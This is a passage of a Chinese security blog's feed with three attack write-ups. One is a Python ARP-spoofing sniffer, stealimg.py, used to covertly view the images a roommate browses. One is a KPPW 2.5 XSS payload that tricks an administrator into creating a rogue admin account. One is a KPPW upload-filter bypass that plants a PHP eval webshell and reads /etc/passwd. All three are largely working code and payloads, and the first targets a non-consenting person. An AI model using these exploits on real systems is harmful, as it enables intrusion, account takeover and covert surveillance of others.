&quot;1&quot;&gt;/proc/sys/net/ipv4/ip_forward</code></pre><p><strong>开启流量转发，这时室友和网关正常通讯，但是流量会经过我们的网卡</strong></p><p><strong>接下来用python编写代码查看室友电脑浏览的网页图片，其实不难，因为浏览图片一般都是向服务器发送一次请求图片的http请求，所以只需从经过我们网卡的流量中过滤tcp80端口的数据包（http协议），将数据包的头部层层去掉，最后便能得到应用层的http数据包，在利用正则表达式将<code>http://*.jpg</code>筛选出来即可知道室友请求了哪些图片，python的pcap库和dpkt库可以使我们很容易的得到电脑网卡流量中的http应用层数据包</strong></p><pre><code>apt-get install libpcap-devpip install pypcappip install dpkt</code></pre><p><strong>安装pcap库和dpkt库</strong></p><p><strong>pcap模块的pcap方法可以返回一个用来捕获网卡数据包的pcap对象</strong></p><p><strong>dpkt，一个数据包解析工具，可以解析离线/实时pcap数据包</strong></p><p><strong>python代码如下stealimg.py</strong></p><pre><code>import pcapimport dpktimport reimport requestsfrom PIL import Imagefrom io import BytesIOfrom optparse import OptionParserimport sysurllist=[]def main():    usage=&quot;Usage: [-i interface]&quot;    parser=OptionParser(usage)    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)    (options,args)=parser.parse_args()    if options.interface:        interface=options.interface        pc=pcap.pcap(interface)        pc.setfilter(&apos;tcp port 80&apos;)        for ptime,pdata in pc:            getimg(pdata)    else:        parser.print_help()        sys.exit(0)def getimg(pdata):    global urllist    p=dpkt.ethernet.Ethernet(pdata)    if p.data.__class__.__name__==&apos;IP&apos;:        if p.data.data.__class__.__name__==&apos;TCP&apos;:            if p.data.data.dport==80:                pa=re.compile(r&apos;GET (.*?\.jpg)&apos;)#|.*?\.png|.*?\.gif                img=re.findall(pa,p.data.data.data)                if img!=[]:                    lines=p.data.data.data.split(&apos;\n&apos;)                    for line in lines:                        if &apos;Host:&apos; in line:                            url=&apos;http://&apos;+line.split(&apos;:&apos;)[-1].strip()+img[-1]                            if url not in urllist:                                urllist.append(url)                                if &apos;Referer:&apos; in p.data.data.data:                                    for line in lines:                                        if &apos;Referer:&apos; in line:                                            referer=line.split(&apos;:&apos;)[-1].strip()                                            print url                                            r=requests.get(url,headers={&apos;Referer&apos;:referer})                                            img=Image.open(BytesIO(r.content))                                            img.show()                                else:                                    r=requests.get(url)                                    img=Image.open(BytesIO(r.content))                                    img.show()                            else:                                passif __name__==&apos;__main__&apos;:    main()  </code></pre><p><strong>代码将pcap从本机网卡捕获到的完整的网络数据包使用dpkt库将其中封装的http应用层数据包提取出来，通过正则表达式将请求图片的http请求过滤出来，并在本机请求并输出，完成窥屏，效果如下</strong></p><p><strong>室友电脑浏览图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/lE1kD92EB0.jpg?imageslim" alt="mark"><br><strong>自己kali可以窥屏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/kI9l6IkGka.jpg?imageslim" alt="mark"></p><p><strong>注意一点，百度的图片爬取要在http请求头中加上Referer字段，否则会出现403禁止访问，代码只是简单的实现了窥屏的效果，还有着很多不足，不过通过这次学习可以对arp欺骗攻击有更深的理解</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;arp协议分析-amp-python编程实现arp欺骗抓图片&quot;&gt;&lt;a href=&quot;#arp协议分析-amp-python编程实现arp欺骗抓图片&quot; class=&quot;headerlink&quot; title=&quot;arp协议分析&amp;amp;python编程实现arp欺骗抓图片&quot;&gt;&lt;/a&gt;arp协议分析&amp;amp;python编程实现arp欺骗抓图片&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>KPPW2.5XSS引起的CSRF</title>
    <link href="http://yoursite.com/2018/01/12/KPPW25xss/"/>
    <id>http://yoursite.com/2018/01/12/KPPW25xss/</id>
    <published>2018-01-12T01:45:22.454Z</published>
    <updated>2018-06-04T15:08:43.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kppw2-5XSS漏洞分析与复现（可csrf）"><a href="#kppw2-5XSS漏洞分析与复现（可csrf）" class="headerlink" title="kppw2.5XSS漏洞分析与复现（可csrf）"></a>kppw2.5XSS漏洞分析与复现（可csrf）</h1><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send</code></pre><p><strong>收件人填目标用户名,标题随便,内容没有转义 ,所以提交内容处可能存在xss，不过过滤了敏感标签和 onerror onload等事件。虽然不能加载js代码，但是还是可以注入html代码，可以用xss漏洞注入html代码触发csrf</strong><br><a id="more"></a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send</code></pre><p><strong>收件人填写admin（网站管理员），向管理员提交私信，内容为我们构造的html代码</strong></p><pre><code>&lt;form action=&quot;http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=&quot; method=&quot;post&quot;&gt;    &lt;input type=hidden name=&quot;edituid&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[username]&quot; value=&quot;qianlan&quot;&gt;    &lt;input type=hidden name=&quot;fds[truename]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[phone]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[qq]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[indus_pid]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[indus_id]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[birthday]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[password]&quot; value=&quot;newadmin&quot;&gt;    &lt;input type=hidden name=&quot;fds[email]&quot; value=&quot;x@q.c&quot;&gt;    &lt;input type=hidden name=&quot;fds[group_id]&quot; value=&quot;1&quot;&gt;    &lt;input type=&quot;submit&quot; name=&quot;is_submit&quot; value=&quot;1&quot;&gt;&lt;/form&gt;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/61IildflAL.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/0l5K9ahhlI.PNG" alt="mark"><br><strong><code>http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=</code>这个url是后台管理员添加用户的url，我们构造表单，action的值设为这个url，写几个隐藏表单诱使管理员去点击提交，就会以管理员的身份去添加一个新的管理员，当然这不是网站管理员的意愿，而是我们的</strong></p><p><strong>提交完成后退出当前网站用户，模拟管理员登陆查看私信，可以看到一个按钮，单单一个按钮，看到的人总会想着去点一下，当然这个按钮可以构造的更具有吸引力</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/76hH05ID8e.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/b3m8d2K1fC.PNG" alt="mark"><br><strong>当点击按钮过后，管理员就会在不知情的情况下发起添加用户的http请求去添加一个用户名为qianlan密码为newadmin的用户，当然这是我们构造的，看用户列表可以看到多了一个名为qianlan的用户，我们登陆一下可以成功进入后台，进行下一步的渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/1gdjJ8kgAd.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/K4e1kIgCJc.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/cKa291JeeF.PNG" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;kppw2-5XSS漏洞分析与复现（可csrf）&quot;&gt;&lt;a href=&quot;#kppw2-5XSS漏洞分析与复现（可csrf）&quot; class=&quot;headerlink&quot; title=&quot;kppw2.5XSS漏洞分析与复现（可csrf）&quot;&gt;&lt;/a&gt;kppw2.5XSS漏洞分析与复现（可csrf）&lt;/h1&gt;&lt;h3 id=&quot;漏洞说明&quot;&gt;&lt;a href=&quot;#漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;漏洞说明&quot;&gt;&lt;/a&gt;漏洞说明&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;http://192.168.50.157/kppw25/index.php?do=user&amp;amp;view=message&amp;amp;op=send
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;收件人填目标用户名,标题随便,内容没有转义 ,所以提交内容处可能存在xss，不过过滤了敏感标签和 onerror onload等事件。虽然不能加载js代码，但是还是可以注入html代码，可以用xss漏洞注入html代码触发csrf&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>KPPW2.5文件上传导致远程代码执行</title>
    <link href="http://yoursite.com/2018/01/11/KPPW25fileupload/"/>
    <id>http://yoursite.com/2018/01/11/KPPW25fileupload/</id>
    <published>2018-01-11T15:01:49.014Z</published>
    <updated>2018-06-04T15:04:56.343Z</updated>
    
    <content type="html"><![CDATA[<h1 id="KPPW2-7文件上传导致远程代码执行漏洞复现"><a href="#KPPW2-7文件上传导致远程代码执行漏洞复现" class="headerlink" title="KPPW2.7文件上传导致远程代码执行漏洞复现"></a>KPPW2.7文件上传导致远程代码执行漏洞复现</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>和上一节的一样，同样是kpww2.5版本，此版本存在文件上传漏洞，攻击者可以上传php一句话木马拿下webshell</strong><br><a id="more"></a></p><p>###上传点###<br><strong>漏洞分析</strong></p><p><strong>在control/ajax/upload.php中：</strong></p><pre><code>$pathDir = setUploadPath($fileType, $objType);$upload = new keke_upload_class(S_ROOT.$pathDir ,$fileFormat,$maxSize);$savename = $upload-&gt;run( $filename , 1);</code></pre><p><strong>再来看run方法：</strong></p><pre><code>function run($fileInput, $randName = 1) {        if (isset ( $_FILES [$fileInput] )) {            $fileArr = $_FILES [$fileInput];            if (is_array ( $fileArr [&apos;name&apos;] )) {                 ....            }            else {                 $this-&gt;getExt ( $fileArr [&apos;name&apos;] );                 $this-&gt;setSavename ();                 if ($this-&gt;copyfile ( $fileArr, $randName )) {                     $this-&gt;returnArray [] = $this-&gt;returninfo;                } else {                    $this-&gt;returninfo [&apos;error&apos;] = $this-&gt;errmsg ();                    $this-&gt;returnArray [] = $this-&gt;returninfo;                }                return $this-&gt;errno ? $this-&gt;errmsg () : $this-&gt;returnArray;            }            return false;        }</code></pre><p><strong>在这段方法中，先是获取了$this-&gt;getExt ( $fileArr [‘name’] ); 文件后缀，这里没有什么问题，然后再生成上传后的随机名+后缀. 最后执行上传操作copyfile</strong></p><pre><code>function copyfile($fileArray, $randName) {        $this-&gt;returninfo = array ();        $this-&gt;returninfo [&apos;name&apos;] = $fileArray [&apos;name&apos;];        if ($randName) {            $this-&gt;returninfo [&apos;saveName&apos;] = $this-&gt;saveName;        } else {            $this-&gt;saveName = $this-&gt;returninfo [&apos;saveName&apos;] = $fileArray [&apos;name&apos;];        }        $this-&gt;returninfo [&apos;size&apos;] = $fileArray [&apos;size&apos;];         $this-&gt;returninfo [&apos;type&apos;] = $fileArray [&apos;type&apos;];        if (! $this-&gt;validateFormat ()) {            $this-&gt;errno = 11;            return false;        }        if(!$this-&gt;fileFilter($fileArray [&quot;tmp_name&quot;],$this-&gt;ext)){            $this-&gt;errno = 21;            return false;        }        if ($this-&gt;savePathFunc) {            $savePathFunc = $this-&gt;savePathFunc;            $this-&gt;savePath = $savePathFunc ( $this-&gt;saveName );            $this-&gt;returninfo [&apos;path&apos;] = $this-&gt;savePath;        }        $this-&gt;makeDirectory ( $this-&gt;savePath );        if (! @is_writable ( $this-&gt;savePath )) {            @mkdir ( $this-&gt;savePath, 0777, true );        }        if ($this-&gt;overwrite == 0 &amp;&amp; @file_exists ( $this-&gt;savePath . $this-&gt;saveName )) {            $this-&gt;errno = 13;            return false;        }        if ($this-&gt;maxSize != 0) {            if ($fileArray [&quot;size&quot;] &gt; $this-&gt;maxSize) {                $this-&gt;errno = 14;                return false;            }        }        if (! @copy ( $fileArray [&quot;tmp_name&quot;], $this-&gt;savePath . $this-&gt;saveName )) {            $this-&gt;errno = $fileArray [&quot;error&quot;];            return false;        }    }</code></pre><p><strong>这里先做了$this-&gt;validateFormat (),根据文件名来获取后缀，再判断后缀是否合法：</strong></p><pre><code>function validateFormat() {        if (! is_array ( $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;ext ), $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;returninfo [&apos;type&apos;] ), $this-&gt;fileFormat ))            return true;        else            return false;    }</code></pre><p><strong>关键看这个条件：<code>in_array ( strtolower ( $this-&gt;returninfo [&#39;type&#39;] ), $this-&gt;fileFormat )</code>,这里判断type是否合法而且用了或操作，等于这边为true了，整个if条件就为true了， 而这个type我们可以改动的，只要抓包把<code>Content-Disposition: form-data; name=&quot;name&quot;; filename=&quot;1.php&quot;Content-Type:</code> 中的Content-Type设置成我们想要的值就可以绕过了。绕过了这个地方以为后面就一帆风顺了，但是还是上传不上去，继续看下面的一个操作$this-&gt;fileFilter($fileArray [“tmp_name”],$this-&gt;ext）这个操作实际上是根据文件头来确定文件的后缀，再检测后缀与之前的文件名获取的后缀是否一致。 这本来是一个很好的过滤方法，但开发人员又写错了：</strong></p><pre><code>function fileFilter($path,$ext){        if(keke_file_class::get_file_type($path,$this-&gt;ext)==$ext){            return true;        }else{            return false;        }    }static function get_file_type($file_path, $ext = &apos;&apos;) {        $fp = fopen ( $file_path, &apos;r&apos; );        $bin = fread ( $fp, 2 );        fclose ( $fp );        $strInfo = @unpack ( &quot;C2chars&quot;, $bin );        $typeCode = intval ( $strInfo [&apos;chars1&apos;] . $strInfo [&apos;chars2&apos;] );        $fileType = &apos;unknown&apos;;        $typeCode == &apos;3780&apos; &amp;&amp; $fileType = &quot;pdf&quot;;        $typeCode == &apos;6787&apos; &amp;&amp; $fileType = &quot;swf&quot;;        $typeCode == &apos;7784&apos; &amp;&amp; $fileType = &quot;midi&quot;;        $typeCode == &apos;7790&apos; &amp;&amp; $fileType = &quot;exe&quot;;        $ext == &apos;txt&apos; &amp;&amp; $fileType = &quot;txt&quot;;        in_array ( $typeCode, array (&apos;8297&apos;, &apos;8075&apos; ) ) &amp;&amp; $fileType = $ext;         if (in_array ( $typeCode, array (&apos;255216&apos;, &apos;7173&apos;, &apos;6677&apos;, &apos;13780&apos; ) )) {             in_array ( $ext, array (&apos;jpg&apos;, &apos;gif&apos;, &apos;bmp&apos;, &apos;png&apos;, &apos;jpeg&apos; ) ) and $fileType = $ext or $fileType = &apos;jpg&apos;;        }        if ($typeCode == &apos;208207&apos;) {             in_array ( $ext, array (&apos;wps&apos;, &apos;ppt&apos;, &apos;dot&apos;, &apos;xls&apos;, &apos;doc&apos;, &apos;docx&apos; ) ) and $fileType = $ext or $fileType = &apos;doc&apos;;        }        return $fileType;    }</code></pre><p><strong>关键看这个操作：in_array ( $typeCode, array (‘8297’, ‘8075’ ) ) &amp;&amp; $fileType = $ext; 如果typecode 等于8297或者8075的时候，就会将filetype赋值为$ext,这样不就是饶过了之前的那个if判断。POC: 只需要将content-type 设置成jpg 再在上传的文件开头写上Ra 就可以成功绕过上传过滤。 （Ra 获取以后的code值就是8297）</strong><br><strong>漏洞利用，构造上传页面</strong></p><pre><code>&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://192.168.50.157/kppw25/index.php?do=ajax&amp;view=upload&amp;file_type=big&amp;filename=filename&quot;&gt;请选择文件： &lt;br&gt;&lt;input name=&quot;filename&quot; type=&quot;file&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;&lt;/form&gt;</code></pre><p><strong>攻击者可在本地上传php一句话木马</strong></p><pre><code>Ra&lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt;</code></pre><p><strong>点击上传文件后相当于向192.168.50.157发送了一次上传文件的http请求，用burp抓包，将content-type改为jpg即可上传成功并返回webshell地址</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/Amai76dbB6.PNG" alt="mark"><br><strong>访问webshell地址即可远程执行命令，比如<code>ifconfig</code>查看ip，<code>cat /etc/passwd</code>查看敏感文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/LEeEDH92h9.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/8Je556HiH8.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/bKCH5mBI8b.PNG" alt="mark"><br><strong>由于之前在安装的时候将kppw25目录下的文件降成了apache权限，所以导致有些root命令不能执行，比如<code>cat /etc/shadow</code>，所以就算攻击者真的拿下webshell也只是apache的权限，没有系统权限,除非利用系统漏洞提权为root</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;KPPW2-7文件上传导致远程代码执行漏洞复现&quot;&gt;&lt;a href=&quot;#KPPW2-7文件上传导致远程代码执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;KPPW2.7文件上传导致远程代码执行漏洞复现&quot;&gt;&lt;/a&gt;KPPW2.7文件上传导致远程代码执行漏洞复现&lt;/h1&gt;&lt;h3 id=&quot;测试环境&quot;&gt;&lt;a href=&quot;#测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试环境&quot;&gt;&lt;/a&gt;测试环境&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;和上一节的一样，同样是kpww2.5版本，此版本存在文件上传漏洞，攻击者可以上传php一句话木马拿下webshell&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
</feed>
